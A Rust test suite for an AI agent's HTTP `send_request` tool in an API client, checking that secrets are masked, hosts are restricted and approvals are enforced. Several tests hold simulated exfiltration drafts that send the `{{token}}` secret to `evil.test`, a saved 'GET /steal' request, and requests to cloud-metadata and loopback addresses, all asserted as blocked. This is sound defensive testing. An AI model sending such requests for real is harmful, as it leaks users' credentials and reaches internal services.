//! `send_request` against local fake upstreams: environments by name, host rules, secrets,
//! history source, redaction of what comes back, limits and workspace scope.

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use serde_json::json;

use super::super::SendRequestTool;
use super::support::{
    SESSION, TOKEN, WS_A, World, blocked, call, http_response, inspect, json_of, raw_server,
    refused, text, text as text_of,
};
use crate::llm::probe::test_support::Reply;
use crate::workspace::HistorySource;

#[tokio::test(flavor = "multi_thread")]
async fn a_saved_request_resolves_the_environment_by_name_and_returns_status_and_headers() {
    let world = World::with(|seen| {
        Reply::json(200, &json!({"path": seen.path, "auth": seen.headers.contains("authorization: bearer tok_live")}))
    })
    .await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv", "environment": "Staging"}),
    )
    .await;
    let value = json_of(&out);
    assert_eq!(value["status"], 200);
    assert_eq!(value["environment"], "Staging");
    assert_eq!(value["workspace"]["name"], "Billing platform");
    assert!(
        value["body"]["text"]
            .as_str()
            .unwrap()
            .contains("\"path\":\"/invoices\"")
    );
    assert!(
        value["body"]["text"]
            .as_str()
            .unwrap()
            .contains("\"auth\":true"),
        "the upstream got the real token"
    );
    assert!(value["elapsed_ms"].is_number());
    assert!(value["headers"].as_array().unwrap().iter().any(|h| {
        h["name"]
            .as_str()
            .unwrap()
            .eq_ignore_ascii_case("content-type")
    }));
    assert!(
        !text(&out).contains(TOKEN),
        "the result never holds the secret value"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn the_result_carries_a_request_view_with_the_history_id_and_workspace() {
    let world = World::new().await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv"}),
    )
    .await;
    let value = json_of(&out);
    let history_id = value["history_id"].as_str().expect("a history id");
    assert_eq!(
        value["view"],
        json!({"kind": "request", "history_id": history_id, "workspace_id": WS_A})
    );
    // The typed hint beside the text is the same view, so the UI never parses the JSON by hand.
    assert_eq!(
        out.meta
            .and_then(|meta| meta.view)
            .map(|view| serde_json::to_value(view).unwrap()),
        Some(json!({"kind": "request", "history_id": history_id})),
        "the result's meta carries the link-out"
    );
    assert!(
        world
            .history()
            .iter()
            .any(|entry| entry.id.as_str() == history_id)
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_send_is_recorded_in_history_with_source_agent_and_the_chat_as_origin() {
    let world = World::new().await;
    call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv"}),
    )
    .await;
    let rows = world.history();
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].source, HistorySource::Agent);
    assert_eq!(rows[0].source_id, SESSION);
    assert_eq!(rows[0].run_id.as_deref(), Some("run_1"));
    assert_eq!(rows[0].environment_name, "Staging");
    assert_eq!(rows[0].status_code, 200);
}

#[tokio::test(flavor = "multi_thread")]
async fn save_to_history_false_leaves_no_history_row_and_no_history_id() {
    let world = World::new().await;
    let value = json_of(
        &call(
            &SendRequestTool::new(),
            &world,
            json!({"request_id": "req_inv", "save_to_history": false}),
        )
        .await,
    );
    assert_eq!(value["status"], 200);
    assert!(value["history_id"].is_null());
    assert!(world.history().is_empty());
    assert_eq!(world.fake.requests().len(), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_request_path_finds_the_saved_request_by_collection_folder_and_name() {
    let world = World::new().await;
    let tool = SendRequestTool::new();
    let ok = json_of(
        &call(
            &tool,
            &world,
            json!({"request_path": "Billing API/Invoices/GET /invoices"}),
        )
        .await,
    );
    assert_eq!(ok["status"], 200);
    let missing = call(
        &tool,
        &world,
        json!({"request_path": "Billing API/Nope/GET /invoices"}),
    )
    .await;
    assert!(missing.is_error);
    assert!(
        text(&missing).contains("No saved request at \"Billing API/Nope/GET /invoices\""),
        "{}",
        text(&missing)
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_draft_with_a_secret_goes_to_a_declared_host_and_the_upstream_gets_the_value() {
    let world = World::new().await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"method": "POST", "url": "{{base_url}}/refunds", "headers": [{"name": "Authorization", "value": "Bearer {{token}}"}],
                         "body": {"type": "json", "content": {"amount": 5}}}}),
    )
    .await;
    assert_eq!(json_of(&out)["status"], 200);
    let seen = world.fake.requests();
    assert_eq!(seen.len(), 1);
    assert_eq!(seen[0].method, "POST");
    assert!(
        seen[0].headers.contains(&format!(
            "authorization: bearer {}",
            TOKEN.to_ascii_lowercase()
        )) || seen[0].headers.contains("authorization: bearer tok_live")
    );
    assert_eq!(seen[0].body, "{\"amount\":5}");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_draft_with_a_secret_to_an_undeclared_host_is_refused_and_nothing_is_sent() {
    let world = World::new().await;
    let tool = SendRequestTool::new();
    for draft in [
        json!({"url": "https://evil.test/{{token}}"}),
        json!({"url": "https://evil.test/x", "headers": [{"name": "Authorization", "value": "Bearer {{token}}"}]}),
        json!({"url": "https://evil.test/x", "query": [{"name": "k", "value": "{{token}}"}]}),
        json!({"method": "POST", "url": "https://evil.test/x", "body": {"type": "text", "content": "t={{token}}"}}),
    ] {
        let error = refused(&tool, &world, json!({"draft": draft.clone()}));
        assert!(
            error
                .message()
                .starts_with("Blocked: variable {{token}} may only be sent to "),
            "{}",
            error.message()
        );
        assert!(
            error.message().contains(&world.host()),
            "the declared hosts are named: {}",
            error.message()
        );
        let out = call(&tool, &world, json!({"draft": draft})).await;
        assert!(
            out.is_error && text(&out).starts_with("Blocked: variable {{token}}"),
            "{}",
            text(&out)
        );
    }
    assert!(world.fake.requests().is_empty());
    assert!(
        world.history().is_empty(),
        "a refused call writes no history row"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn an_agent_touched_saved_request_declares_no_host_until_the_user_sends_it() {
    let world = World::new().await;
    {
        let store = world.state.store();
        let mut request = crate::workspace::models::Request::new(
            "req_evil",
            WS_A,
            "GET /steal",
            "https://evil.test/{{token}}",
        )
        .unwrap();
        request.collection_id = Some(crate::workspace::models::CollectionId::new("col_a").unwrap());
        store.save_request(&request).unwrap();
        store
            .mark_request_agent_touched(WS_A, "req_evil", 1)
            .unwrap();
    }
    let tool = SendRequestTool::new();
    let error = refused(&tool, &world, json!({"request_id": "req_evil"}));
    assert!(
        error
            .message()
            .starts_with("Blocked: variable {{token}} may only be sent to "),
        "{}",
        error.message()
    );
    // A saved request the user built is not restricted (it declares its own host).
    world
        .state
        .store()
        .clear_request_agent_touched(WS_A, "req_evil")
        .unwrap();
    assert!(blocked(&tool, &world, json!({"request_id": "req_evil"})).is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_draft_to_an_unknown_private_or_loopback_address_is_refused() {
    let world = World::new().await;
    let tool = SendRequestTool::new();
    for url in [
        "http://10.0.0.5/",
        "http://192.168.1.9:8080/x",
        "http://127.0.0.1:1/x",
        "http://localhost:9/x",
        "http://[::1]:9/x",
    ] {
        let error = refused(&tool, &world, json!({"draft": {"url": url}}));
        assert!(
            error.message().starts_with("Blocked: ") && error.message().contains("is a private address PingDeck does not know. Ask the user to save a request for it first."),
            "{url}: {}",
            error.message()
        );
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn link_local_and_metadata_addresses_are_refused_for_drafts_even_when_declared() {
    let world = World::new().await;
    // Even an environment that names the address cannot make it reachable.
    {
        let store = world.state.store();
        let mut environment = crate::workspace::Environment::new("env_meta", WS_A, "Meta").unwrap();
        environment.declared_hosts = vec!["169.254.169.254".to_owned()];
        store.save_environment(&environment).unwrap();
    }
    let tool = SendRequestTool::new();
    for url in [
        "http://169.254.169.254/latest",
        "http://[fe80::1]/x",
        "http://100.100.100.200/x",
        "http://0.0.0.0/x",
    ] {
        let error = refused(
            &tool,
            &world,
            json!({"draft": {"url": url}, "environment": "Meta"}),
        );
        assert!(
            error.message().contains("link-local or cloud-metadata"),
            "{url}: {}",
            error.message()
        );
        let out = call(
            &tool,
            &world,
            json!({"draft": {"url": url}, "environment": "Meta"}),
        )
        .await;
        assert!(out.is_error);
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_response_echoing_the_secret_reaches_the_model_masked_in_every_form() {
    let encoded: String = url::form_urlencoded::byte_serialize(TOKEN.as_bytes()).collect();
    let b64 = STANDARD.encode(TOKEN);
    let body = format!("plain={TOKEN} enc={encoded} b64={b64} key=sk-abcdefghijklmnop1234");
    let world = World::with(move |_| Reply::Json(200, body.clone())).await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv"}),
    )
    .await;
    let shown = text(&out);
    assert!(
        !shown.contains(TOKEN)
            && !shown.contains(&b64)
            && !shown.contains("sk-abcdefghijklmnop1234"),
        "{shown}"
    );
    assert!(shown.matches("{{secret:token}}").count() >= 3, "{shown}");
}

#[tokio::test(flavor = "multi_thread")]
async fn credential_response_headers_show_as_redacted_and_other_headers_stay() {
    let response = http_response(
        &[
            ("Set-Cookie", "sid=topsecretsession; Path=/"),
            ("X-Api-Key", "kkkk-9999-aaaa"),
            ("X-Request-Id", "req-42"),
            ("Content-Type", "text/plain"),
        ],
        b"hello",
    );
    let (addr, _) = raw_server(response).await;
    let world = World::new().await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"url": format!("http://{addr}/x")}, "environment": "Staging"}),
    )
    .await;
    // The raw server is not declared by the environment: allow it by declaring it.
    assert!(
        out.is_error,
        "an unknown loopback server is refused first: {}",
        text(&out)
    );
    {
        let store = world.state.store();
        let mut environment = crate::workspace::Environment::new("env_raw", WS_A, "Raw").unwrap();
        environment.declared_hosts = vec![addr.to_string()];
        store.save_environment(&environment).unwrap();
    }
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"url": format!("http://{addr}/x")}, "environment": "Raw"}),
    )
    .await;
    let value = json_of(&out);
    let header = |name: &str| {
        value["headers"]
            .as_array()
            .unwrap()
            .iter()
            .find(|h| h["name"].as_str().unwrap().eq_ignore_ascii_case(name))
            .map(|h| h["value"].as_str().unwrap().to_owned())
    };
    assert_eq!(header("Set-Cookie").as_deref(), Some("<redacted>"));
    assert_eq!(header("X-Api-Key").as_deref(), Some("<redacted>"));
    assert_eq!(header("X-Request-Id").as_deref(), Some("req-42"));
    assert!(!text(&out).contains("topsecretsession"));
    assert_eq!(value["body"]["text"], "hello");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_binary_body_reports_its_type_and_size_only() {
    let bytes: Vec<u8> = (0..=255).collect();
    let response = http_response(&[("Content-Type", "application/octet-stream")], &bytes);
    let (addr, _) = raw_server(response).await;
    let world = World::new().await;
    {
        let store = world.state.store();
        let mut environment = crate::workspace::Environment::new("env_raw", WS_A, "Raw").unwrap();
        environment.declared_hosts = vec![addr.to_string()];
        store.save_environment(&environment).unwrap();
    }
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"url": format!("http://{addr}/b")}, "environment": "Raw"}),
    )
    .await;
    let value = json_of(&out);
    assert_eq!(value["body"]["binary"], true);
    assert_eq!(value["body"]["size_bytes"], 256);
    assert_eq!(value["body"]["content_type"], "application/octet-stream");
    assert!(value["body"].get("text").is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn at_most_twenty_sends_per_run_and_a_new_run_starts_fresh() {
    let world = World::new().await;
    let tool = SendRequestTool::new();
    let args = json!({"request_id": "req_inv", "save_to_history": false});
    for _ in 0..20 {
        let out = {
            let ctx = world.ctx_in(SESSION, "run_x");
            crate::agent::tools::AgentTool::call(&tool, &ctx, args.clone()).await
        };
        assert!(!out.is_error, "{}", text(&out));
    }
    let ctx = world.ctx_in(SESSION, "run_x");
    let refused = crate::agent::tools::AgentTool::call(&tool, &ctx, args.clone()).await;
    assert!(
        refused.is_error && text(&refused).contains("At most 20 sends per turn."),
        "{}",
        text(&refused)
    );
    assert_eq!(world.fake.requests().len(), 20);
    let ctx = world.ctx_in(SESSION, "run_y");
    assert!(
        !crate::agent::tools::AgentTool::call(&tool, &ctx, args)
            .await
            .is_error
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_request_of_another_workspace_is_not_found_and_nothing_is_sent() {
    let world = World::new().await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_other"}),
    )
    .await;
    assert!(out.is_error);
    assert!(
        text(&out).contains("No saved request req_other in workspace \"Billing platform\""),
        "{}",
        text(&out)
    );
    assert!(world.fake.requests().is_empty());
    let by_path = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_path": "Other API/GET /secret"}),
    )
    .await;
    assert!(by_path.is_error && text(&by_path).contains("No saved request at"));
}

#[tokio::test(flavor = "multi_thread")]
async fn an_ai_request_is_refused_with_where_to_run_it_and_nothing_is_sent() {
    use crate::workspace::ai_request::{AiRequestConfig, AiTarget, RequestMode};
    use crate::workspace::models::Request;
    let world = World::new().await;
    let mut request =
        Request::new("req_ai", WS_A, "Summarise", "https://provider.invalid").unwrap();
    request.mode = RequestMode::AiApi;
    request.ai = Some(AiRequestConfig {
        target: AiTarget::Provider {
            provider_id: "prv_1".to_owned(),
            provider_name: "Relay".to_owned(),
            base_url_hint: String::new(),
            model: "gpt-x".to_owned(),
        },
        ..AiRequestConfig::default()
    });
    world.state.store().save_request(&request).unwrap();
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_ai"}),
    )
    .await;
    assert!(out.is_error);
    assert!(
        text(&out).contains("has to run in the Requests module")
            && text(&out).contains("get_trace"),
        "{}",
        text(&out)
    );
    assert!(world.fake.requests().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_chat_without_a_workspace_binding_cannot_send() {
    let world = World::new().await;
    world
        .state
        .store()
        .save_agent_session(&super::support::session("sess_unbound"))
        .unwrap();
    let ctx = world.ctx_in("sess_unbound", "run_1");
    let out = crate::agent::tools::AgentTool::call(
        &SendRequestTool::new(),
        &ctx,
        json!({"request_id": "req_inv"}),
    )
    .await;
    assert!(
        out.is_error && text(&out).contains("not bound to a PingDeck workspace"),
        "{}",
        text(&out)
    );
    assert!(world.fake.requests().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_chat_whose_workspace_was_deleted_gets_a_readable_result() {
    let world = World::new().await;
    let id = crate::workspace::WorkspaceId::new(WS_A).unwrap();
    assert!(world.state.store().delete_workspace(&id).unwrap());
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv"}),
    )
    .await;
    assert!(
        out.is_error && text(&out).contains("bound to has been deleted"),
        "{}",
        text(&out)
    );
    assert!(world.fake.requests().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_transport_is_an_error_result_and_the_secret_stays_out_of_it() {
    // A closed port on a declared host: the connection is refused.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    drop(listener);
    let world = World::new().await;
    {
        let store = world.state.store();
        let mut environment = crate::workspace::Environment::new("env_dead", WS_A, "Dead").unwrap();
        environment.declared_hosts = vec![addr.to_string()];
        environment.variables =
            vec![crate::workspace::EnvironmentVariable::masked("token", TOKEN).unwrap()];
        store.save_environment(&environment).unwrap();
    }
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"url": format!("http://{addr}/x?token={{{{token}}}}")}, "environment": "Dead"}),
    )
    .await;
    assert!(out.is_error);
    assert!(!text(&out).contains(TOKEN), "{}", text(&out));
}

#[tokio::test(flavor = "multi_thread")]
async fn the_forced_ask_follows_the_resolved_target_host() {
    let world = World::new().await;
    {
        let store = world.state.store();
        let mut production = store
            .list_environments(WS_A)
            .unwrap()
            .into_iter()
            .find(|environment| environment.name == "Production")
            .unwrap();
        production.declared_hosts = vec!["api.prod.test".to_owned()];
        store.save_environment(&production).unwrap();
    }
    let tool = SendRequestTool::new();
    // The chat's environment is Staging unless a row names another.
    for (args, code) in [
        (json!({"request_id": "req_inv"}), None),
        (
            json!({"request_id": "req_inv", "environment": "Production"}),
            Some("production"),
        ),
        // A production host written as a literal while Staging is chosen.
        (
            json!({"draft": {"url": "https://api.prod.test/v1/refunds"}}),
            Some("guarded_host"),
        ),
        (
            json!({"draft": {"url": "https://api.public.test/x"}}),
            Some("undeclared_host"),
        ),
    ] {
        let inspection = inspect(&tool, &world, args.clone()).unwrap();
        assert_eq!(inspection.ask_code, code, "{args}");
        assert_eq!(inspection.always_ask.is_some(), code.is_some(), "{args}");
        assert!(inspection.hard_block.is_none(), "{args}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_guarded_environment_shows_the_model_only_the_shape() {
    let padding = "x".repeat(3000);
    let world = World::with(move |seen| {
        if seen.path.starts_with("/fail") {
            Reply::Json(404, format!("invoice inv_9 not found {padding}"))
        } else {
            Reply::json(
                200,
                &json!({"id": 7, "owner": {"email": "ann@corp.test"}, "items": [{"sku": "A-1"}]}),
            )
        }
    })
    .await;
    {
        let store = world.state.store();
        let id = crate::workspace::RequestId::new("req_inv").unwrap();
        let mut request = store
            .get_request(&crate::workspace::WorkspaceId::new(WS_A).unwrap(), &id)
            .unwrap()
            .unwrap();
        request.test_script =
            r#"pm.test("is 200", () => pm.expect(pm.response.code).to.equal(200));"#.to_owned();
        store.save_request(&request).unwrap();
    }
    let tool = SendRequestTool::new();
    let shown = json_of(
        &call(
            &tool,
            &world,
            json!({"request_id": "req_inv", "environment": "Production"}),
        )
        .await,
    );
    assert_eq!(shown["body_view"], "shape");
    assert_eq!(
        shown["body"]["shape"],
        json!({"id": "number", "owner": {"email": "string"}, "items": [{"sku": "string"}]})
    );
    assert!(shown["body"].get("error_text").is_none());
    assert_eq!(
        shown["script_tests"],
        json!([{"name": "is 200", "passed": true, "skipped": false}])
    );
    assert_eq!(shown["attempts"], 1);
    let text = shown.to_string();
    assert!(
        !text.contains("ann@corp.test") && !text.contains("A-1"),
        "no value reaches the model, nor a spilled handle: {text}"
    );

    let failed = json_of(
        &call(
            &tool,
            &world,
            json!({"draft": {"url": "{{base_url}}/fail"}, "environment": "Production"}),
        )
        .await,
    );
    let error_text = failed["body"]["error_text"].as_str().unwrap();
    assert!(
        error_text.starts_with("invoice inv_9 not found"),
        "{error_text}"
    );
    assert!(error_text.len() < 2300, "a 4xx keeps at most 2 KB");

    // Elsewhere the model asks for the shape or a JSONPath subtree itself.
    for (args, body) in [
        (
            json!({"request_id": "req_inv", "body": "shape", "path": "$.owner"}),
            json!({"shape": {"email": "string"}}),
        ),
        (
            json!({"request_id": "req_inv", "path": "$.items[0].sku"}),
            json!({"text": "\"A-1\""}),
        ),
    ] {
        let value = json_of(&call(&tool, &world, args.clone()).await);
        let (key, expected) = body.as_object().unwrap().iter().next().unwrap();
        assert_eq!(&value["body"][key], expected, "{args}");
    }
    let bad = call(
        &tool,
        &world,
        json!({"request_id": "req_inv", "path": "$..["}),
    )
    .await;
    assert!(bad.is_error && text_of(&bad).contains("path is not valid"));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_of_another_guarded_environment_shows_the_model_only_the_shape() {
    let world =
        World::with(|_| Reply::json(200, &json!({"owner": {"email": "ann@corp.test"}}))).await;
    {
        let store = world.state.store();
        store
            .save_environment(&crate::workspace::Environment::new("env_dev", WS_A, "Dev").unwrap())
            .unwrap();
        let literal = crate::workspace::models::Request::new(
            "req_lit",
            WS_A,
            "GET literal",
            format!("{}/invoices", world.base_url()),
        )
        .unwrap();
        store.save_request(&literal).unwrap();
    }
    // Dev declares nothing; the target host is one Production declares.
    let shown = json_of(
        &call(
            &SendRequestTool::new(),
            &world,
            json!({"request_id": "req_lit", "environment": "Dev"}),
        )
        .await,
    );
    assert_eq!(shown["body_view"], "shape");
    assert!(!shown.to_string().contains("ann@corp.test"), "{shown}");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_redirect_on_the_same_host_is_followed_and_a_refusal_names_no_secret_it_lacks() {
    let world = World::with(|seen| match seen.path.as_str() {
        "/hop" => Reply::Redirect("/final".to_owned()),
        "/away" => Reply::Redirect("http://other.test/x".to_owned()),
        _ => Reply::json(200, &json!({"ok": true})),
    })
    .await;
    {
        // The host comes from a collection variable, which declares nothing, and the
        // environment declares no host either.
        let store = world.state.store();
        let mut collection =
            crate::workspace::models::Collection::new("col_hop", WS_A, "Hops").unwrap();
        collection.variables = vec![
            crate::workspace::EnvironmentVariable::plain("hop_base", world.base_url()).unwrap(),
        ];
        store.save_collection(&collection).unwrap();
        for (id, path) in [("req_hop", "/hop"), ("req_away", "/away")] {
            let mut request = crate::workspace::models::Request::new(
                id,
                WS_A,
                id,
                format!("{{{{hop_base}}}}{path}"),
            )
            .unwrap();
            request.collection_id =
                Some(crate::workspace::models::CollectionId::new("col_hop").unwrap());
            store.save_request(&request).unwrap();
        }
        store
            .save_environment(
                &crate::workspace::Environment::new("env_bare", WS_A, "Bare").unwrap(),
            )
            .unwrap();
    }
    let tool = SendRequestTool::new();
    let followed = json_of(
        &call(
            &tool,
            &world,
            json!({"request_id": "req_hop", "environment": "Bare"}),
        )
        .await,
    );
    assert_eq!(followed["status"], 200);
    let refused = call(
        &tool,
        &world,
        json!({"request_id": "req_away", "environment": "Bare"}),
    )
    .await;
    assert!(refused.is_error, "{}", text_of(&refused));
    assert!(
        text_of(&refused).contains("a redirect to other.test")
            && !text_of(&refused).contains("carries a secret"),
        "{}",
        text_of(&refused)
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_method_that_can_change_the_server_is_recorded_even_when_the_model_asks_not_to() {
    let world = World::new().await;
    let value = json_of(
        &call(
            &SendRequestTool::new(),
            &world,
            json!({"draft": {"method": "POST", "url": "{{base_url}}/refunds"}, "save_to_history": false}),
        )
        .await,
    );
    assert!(value["history_id"].is_string());
    assert_eq!(world.history().len(), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_literal_credential_the_send_carried_is_masked_by_value_when_the_server_echoes_it() {
    const LITERAL: &str = "lit3ral-key-value-0001";
    let world = World::with(|seen| {
        let echoed = seen
            .headers
            .lines()
            .find_map(|line| line.strip_prefix("x-api-key: "))
            .unwrap_or_default()
            .trim()
            .to_owned();
        Reply::json(200, &json!({"seen": echoed}))
    })
    .await;
    let out = call(
        &SendRequestTool::new(),
        &world,
        json!({"draft": {"url": "{{base_url}}/echo", "headers": [{"name": "X-Api-Key", "value": LITERAL}]}}),
    )
    .await;
    let body = json_of(&out)["body"]["text"].as_str().unwrap().to_owned();
    assert!(
        !text(&out).contains(LITERAL),
        "the literal never reaches the model"
    );
    assert!(body.contains("{{secret:sent credential}}"), "{body}");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_send_neither_reads_nor_writes_the_workspace_cookie_jar() {
    let world = World::new().await;
    let cookie = crate::workspace::CookieJarEntry::from_response_cookie(
        WS_A,
        None,
        format!("{}/login", world.base_url()),
        "session",
        "user-session-value",
        None,
        Some("/"),
        None,
        None,
        false,
        false,
        None,
        "2026-01-01T00:00:00Z",
    )
    .unwrap();
    world
        .state
        .store()
        .save_cookie_jar_entries(WS_A, &[cookie])
        .unwrap();
    json_of(
        &call(
            &SendRequestTool::new(),
            &world,
            json!({"request_id": "req_inv"}),
        )
        .await,
    );
    let seen = world.fake.requests();
    assert!(
        !seen[0].headers.contains("user-session-value"),
        "the user's session cookie stays out of an agent send"
    );
    assert_eq!(world.state.store().list_cookie_jar(WS_A).unwrap().len(), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_call_whose_target_changed_after_its_card_sends_nothing() {
    let world = World::new().await;
    let tool = SendRequestTool::new();
    let args = json!({"request_id": "req_inv"});
    inspect(&tool, &world, args.clone()).unwrap();
    let mut request = world
        .state
        .store()
        .get_request(
            &crate::workspace::WorkspaceId::new(WS_A).unwrap(),
            &crate::workspace::RequestId::new("req_inv").unwrap(),
        )
        .unwrap()
        .unwrap();
    request.url = "{{base_url}}/elsewhere".into();
    world.state.store().save_request(&request).unwrap();
    let out = call(&tool, &world, args).await;
    assert!(out.is_error);
    assert!(text(&out).contains("changed after it was approved"));
    assert!(world.fake.requests().is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn generated_built_in_variables_do_not_break_the_approved_target_check() {
    let world = World::new().await;
    let mut request = world
        .state
        .store()
        .get_request(
            &crate::workspace::WorkspaceId::new(WS_A).unwrap(),
            &crate::workspace::RequestId::new("req_inv").unwrap(),
        )
        .unwrap()
        .unwrap();
    request.url = "{{base_url}}/invoices?id={{$guid}}".into();
    request.query_params = vec![crate::workspace::KeyValue {
        key: "nonce".into(),
        value: "{{ $randomUUID }}".into(),
        enabled: true,
        description: None,
    }];
    world.state.store().save_request(&request).unwrap();
    let tool = SendRequestTool::new();
    let args = json!({"request_id": "req_inv"});
    inspect(&tool, &world, args.clone()).unwrap();
    let out = call(&tool, &world, args).await;
    assert!(!out.is_error, "{}", text(&out));
    let seen = world.fake.requests();
    assert_eq!(seen.len(), 1);
    let target = &seen[0].path;
    assert!(target.contains("nonce="), "{target}");
    assert!(
        !target.contains("guid") && !target.contains("random"),
        "the send itself resolves the tokens: {target}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn the_card_counts_a_credential_the_request_inherits_from_its_collection() {
    let world = World::new().await;
    let mut collection = world
        .state
        .store()
        .list_collections(WS_A)
        .unwrap()
        .into_iter()
        .find(|collection| collection.id.as_str() == "col_a")
        .unwrap();
    collection.auth = crate::workspace::AuthConfig::Bearer {
        token_ref: "{{token}}".into(),
    };
    world.state.store().save_collection(&collection).unwrap();
    let mut request = world
        .state
        .store()
        .get_request(
            &crate::workspace::WorkspaceId::new(WS_A).unwrap(),
            &crate::workspace::RequestId::new("req_inv").unwrap(),
        )
        .unwrap()
        .unwrap();
    request.headers.clear();
    request.auth = crate::workspace::AuthConfig::Inherit;
    world.state.store().save_request(&request).unwrap();
    let inspection = inspect(
        &SendRequestTool::new(),
        &world,
        json!({"request_id": "req_inv"}),
    )
    .unwrap();
    let Some(crate::agent::tools::ToolApprovalPreview::Summary { text }) = inspection.preview
    else {
        panic!("a summary card");
    };
    assert!(text.contains("{{secret:token}}"), "{text}");
}
